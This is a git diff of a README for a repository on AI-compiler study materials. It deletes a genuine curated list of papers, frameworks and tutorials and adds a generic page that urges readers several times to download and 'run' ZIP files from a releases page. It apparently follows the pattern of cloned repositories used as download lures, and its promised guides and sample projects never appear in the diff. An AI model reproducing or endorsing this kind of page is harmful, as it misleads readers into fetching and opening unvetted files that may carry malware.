@@ -1,77 +1,48 @@
-## AI compilers study materials 
+# 📚 ai-compilers-study-material - Essential Resources for AI Compilers
 
-### Description
-This repository is designed as a focused resource for individuals beginning work in the field of AI compilers and systems.
+## 🏷️ Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/appelera/ai-compilers-study-material/releases)
 
-​By AI compilers, I specifically refer to the software stack responsible for translating and optimizing DNN models into efficient assembly code for various accelerators, including GPUs and NPUs.
+## 📖 Overview
+Welcome to the **ai-compilers-study-material** repository. This is a collection of study materials designed to help you learn about AI compilers and systems. Whether you are a student, a professional, or simply curious, you will find valuable resources here that make it easier to understand AI compilation.
 
-​I have curated the most valuable resources I've encountered to date to provide a solid starting point.
+## 🚀 Getting Started
+Follow these steps to download and run the software:
 
-### Prerequisites
-- Basic understanding of DNN and Transformer architectures.
-- Some experience on parallel programming and GPUs (e.g., implementing matmul on CUDA).
+### Step 1: Visit the Releases Page
+To access the latest release, [visit this page to download](https://github.com/appelera/ai-compilers-study-material/releases). This page contains all available versions of the study materials.
 
-### Introductions
-- [A friendly introduction to machine learning compilers and optimizers](https://huyenchip.com/2021/09/07/a-friendly-introduction-to-machine-learning-compilers-and-optimizers.html)
-- [Democratizing AI compute: Part 6](https://www.modular.com/blog/democratizing-ai-compute-part-6-what-about-ai-compilers)
-  - Strongly recommend to read the full series.
-- [Introduction to AI compilers](https://docs.google.com/presentation/d/1RZdV3Z-Q1NEbpU1-qk9C97yE1QvwNLJ9Gc7JLaFLZCw/edit?slide=id.p#slide=id.p)
+### Step 2: Select the Appropriate Version
+On the releases page, you will see a list of versions. Click on the version that you want to download. Each release may come with different materials; choose the one that suits your needs the best.
 
-### State of AI compilers
-- In the pre-LLM era, AI compilers consist of **graph compilers + kernel libraries / compilers**. 
-  - Graph compilers perform various computational graph-level optimizations.
-  - Kernels for individual operators can be crafted by direct programming (*kernel libraries*) or automatic generation (*kernel compilers*).
-  - [TVM](https://github.com/apache/tvm) and [XLA](https://github.com/openxla/xla) were the most popular compiler frameworks.
-- After the domination of LLMs, the focus has shifted to **LLM runtimes + attention kernels**.
-  - LLMs, or autoregressive Transformers with self-attention, has become the core workload.
-  - Hence, it is crucial to optimize its performance to the last bit via runtime strategies and custom attention kernels.
-  - [vLLM](https://github.com/vllm-project/vllm) runtime with attention kernels written in [CUTLASS](https://docs.nvidia.com/cutlass/index.html) or [Triton](https://github.com/triton-lang/triton) is a popular choice.
-- Nonetheless, AI compilers remain to be an important topic. 
-  - Graph compilers can accelerate the rest of the model[[example](https://blog.vllm.ai/2025/08/20/torch-compile.html)], used together with custom attention kernels.
-  - Kernel programming, especially for recent GPU architectures, remains to be complex and ad-hoc[[paper](https://arxiv.org/html/2504.07004v1)].
-  - AI compilers can support faster prototyping for different attention algorithms, or even non-Transformer models [[mamba](https://arxiv.org/pdf/2312.00752)].
+### Step 3: Download the Files
+Look for the downloadable files in the release details. You can usually find ZIP files or PDF documents. Click on the links to start the download. 
 
-### Papers
-- [List of papers](https://github.com/merrymercy/awesome-tensor-compilers)
-- There is [a survey paper](https://arxiv.org/abs/2002.03794), but keep in mind that it is a bit outdated (2020).
-- I'd recommend skimming through recent ML/DNN/AI compiler papers on ASPLOS/MLSys/PLDI/ISCA, such as [Relax](https://arxiv.org/pdf/2311.02103), [Cypress](https://arxiv.org/pdf/2504.07004), [Exo2](https://arxiv.org/pdf/2411.07211).
-- FlashAttention series and PagedAttention are also recommended to understand the gist of kernel optimization for LLMs[[1](https://arxiv.org/pdf/2205.14135)][[2](https://arxiv.org/pdf/2307.08691)][[3](https://arxiv.org/pdf/2407.08608)][[decoding](https://arxiv.org/pdf/2311.01282)][[paged](https://arxiv.org/pdf/2309.06180)].
+### Step 4: Extract the Files
+If you downloaded a ZIP file, locate the file on your computer. Right-click the file and select “Extract All” or “Unzip” to access the contents.
 
-### Frameworks
-#### Graph compilers + Kernel libraries
-- NVIDIA [TensorRT](https://github.com/NVIDIA/TensorRT) + [cuDNN](https://developer.nvidia.com/cudnn)
-  - Core logics are closed-sourced.
-- Intel [OpenVino](https://github.com/openvinotoolkit/openvino) + [oneDNN](https://github.com/uxlfoundation/oneDNN)
+### Step 5: Open the Study Materials
+Now that you've extracted the files, you will find various documents, tutorials, and presentations. Open any file by double-clicking on it. 
 
-#### Graph & Kernel compilers
-- [TorchInductor](https://github.com/pytorch/pytorch/tree/main/torch/_inductor)
-- [TVM](https://github.com/apache/tvm)
-- [XLA](https://github.com/openxla/xla)
+## ✅ System Requirements
+To use the study materials effectively, ensure you have:
 
-#### LLM runtimes
-- [vLLM](https://github.com/vllm-project/vllm)
-- NVIDIA [TensorRT-LLM](https://github.com/NVIDIA/TensorRT-LLM)
+- A computer with Windows, macOS, or Linux
+- A PDF reader installed (for PDF files)
+- A web browser (for documents and any online resources)
 
-#### Kernel languages
-- NVIDIA [CUTLASS](https://docs.nvidia.com/cutlass/index.html)
-- [Triton](https://github.com/triton-lang/triton)
-  - For recent Hopper/Blackwell GPUs, Triton struggles to achieve optimal performance due to the increased complexity of GPU.
-  - To mitigate this, [Gluon](https://github.com/triton-lang/triton/blob/main/python/tutorials/gluon/01-intro.py) is being developed within the Triton ecosystem, which exposes more lower-level controls akin to CUTLASS.
+## 🛠️ Features
+- **Comprehensive Guides:** In-depth guides that cover fundamental concepts of AI compilers.
+- **Tutorials:** Step-by-step tutorials for practical understanding.
+- **Sample Projects:** Example projects that allow you to see concepts in action.
 
-### Hands-on tutorials
-- TVM
-  - https://mlc.ai/
-  - https://tvm.d2l.ai/
-- Triton
-  - https://github.com/srush/Triton-Puzzles
-  - https://triton-lang.org/main/getting-started/tutorials/index.html
-- TorchInductor
-  - https://github.com/meta-pytorch/workshops/tree/master/ASPLOS_2024
-  - https://docs.google.com/document/d/1zY9Nlmh5jT39Q92aDYf3dHOAXh2xCMdeS6pnbX0Dqpw/edit?usp=drivesdk
- 
-### Other useful materials
-- [GPU MODE Youtube channel](https://www.youtube.com/@GPUMODE)
-- [AI compilers study](https://carpedm30.notion.site/AI-Compiler-Study-aaf4cff2c8734e50ad95ac6230dbd80b)
-- [Matrix Multiplication on Blackwell](https://www.modular.com/blog/matrix-multiplication-on-nvidias-blackwell-part-1-introduction)
-- [How to Scale Your Model: A Systems View of LLMs on TPUs](https://jax-ml.github.io/scaling-book/)
-- [Domain-specific architectures for AI inference](https://fleetwood.dev/posts/domain-specific-architectures)
+## 📥 Download & Install
+To begin your journey, [visit this page to download](https://github.com/appelera/ai-compilers-study-material/releases). Follow the steps outlined above to access the resources.
+
+## 💬 Need Help?
+If you have questions or encounter issues, feel free to open an issue on the GitHub repository. We are here to help you along your learning path.
+
+## 📅 Updates
+We will regularly update the repository with new materials and resources. Check back often for the most recent study aids and improvements. 
+
+Thank you for choosing the **ai-compilers-study-material** for your learning needs. Enjoy your exploration into the world of AI compilers!
